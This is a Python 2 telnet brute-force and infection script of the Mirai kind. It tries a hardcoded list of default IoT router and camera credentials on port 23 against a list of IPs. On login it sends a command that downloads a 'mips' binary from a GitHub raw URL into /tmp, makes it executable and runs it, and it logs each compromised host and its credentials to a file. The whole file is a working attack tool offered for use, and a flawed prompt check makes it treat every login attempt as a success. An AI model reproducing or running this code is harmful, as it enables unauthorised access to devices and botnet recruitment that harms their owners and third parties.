import threading
import sys, os, re, time, socket
from queue import *
from sys import stdout

if len(sys.argv) < 4:
    print "Usage: python "+sys.argv[0]+" <list> <threads> <output file>"
    sys.exit()

combo = ["root:root", "admin:admin", "root:vizxv", "root:Serv4EMC", "default:default", "default:OxhlwSG8", "default:S2fGqNFs", "root:xc3511", "admin:dvr2580222", "guest:guest", "daemon:daemon", "root:ipcam_rt5350", "root:hi3518", "user:user", "root:GM8182", "root:5up", "root:password", "admin:password", "ubnt:ubnt", "root:Zte521", "root:vertex25ektks123"]

ips = open(sys.argv[1], "r").readlines()
threads = int(sys.argv[2])
output_file = sys.argv[3]
queue = Queue()
queue_count = 0

for ip in ips:
    queue_count += 1
    stdout.write("\r[%d] Added to queue" % queue_count)
    stdout.flush()
    queue.put(ip)
print "\n"


class router(threading.Thread):
    def __init__ (self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip).rstrip('\n')
        self.rekdevice="cd /tmp; wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips; busybox wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips; chmod 777 mips; ./mips"
    def run(self):
        global fh
        username = ""
        password = ""
        for passwd in combo:
            if ":n/a" in passwd:
                password=""
            else:
                password=passwd.split(":")[1]
            if "n/a:" in passwd:
                username=""
            else:
                username=passwd.split(":")[0]
            try:
                tn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                tn.settimeout(0.37)
                tn.connect((self.ip,23))
            except Exception:
                tn.close()
                break
            try:
                hoho = ''
                hoho += readUntil(tn, ":")
                if ":" in hoho:
                    tn.send(username + "\r\n")
                    time.sleep(0.1)
            except Exception:
                tn.close()
            try:
                hoho = ''
                hoho += readUntil(tn, ":")
                if ":" in hoho:
                    tn.send(password + "\r\n")
                    time.sleep(0.1)
                else:
                    pass
            except Exception:
                tn.close()
            try:
                prompt = ''
                prompt += tn.recv(40960)
                if "#" in prompt or "$":
                    success = True              
                else:
                    tn.close()
                if success == True:
                    try:
                        tn.send(self.rekdevice + "\r\n")
                        fh.write(self.ip + ":23 " + username + ":" + password + "\n")
                        fh.flush()
                        print "[+] GOTCHA -> %s:%s:%s"%(username, password, self.ip)
                        tn.close()
                        break
                    except:
                        tn.close()
                else:
                    tn.close()
            except Exception:
                tn.close()

def readUntil(tn, string, timeout=6):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.01)
        if string in buf: return buf
    raise Exception('TIMEOUT!')

def worker():
    try:
        while True:
            try:
                IP = queue.get()
                thread = router(IP)
                thread.start()
                queue.task_done()
                time.sleep(0.02)
            except:
                pass
    except:
        pass

global fh
fh = open("workingtelnet.txt","a")
for l in xrange(threads):
    try:
        t = threading.Thread(target=worker)
        t.start()
    except:
        pass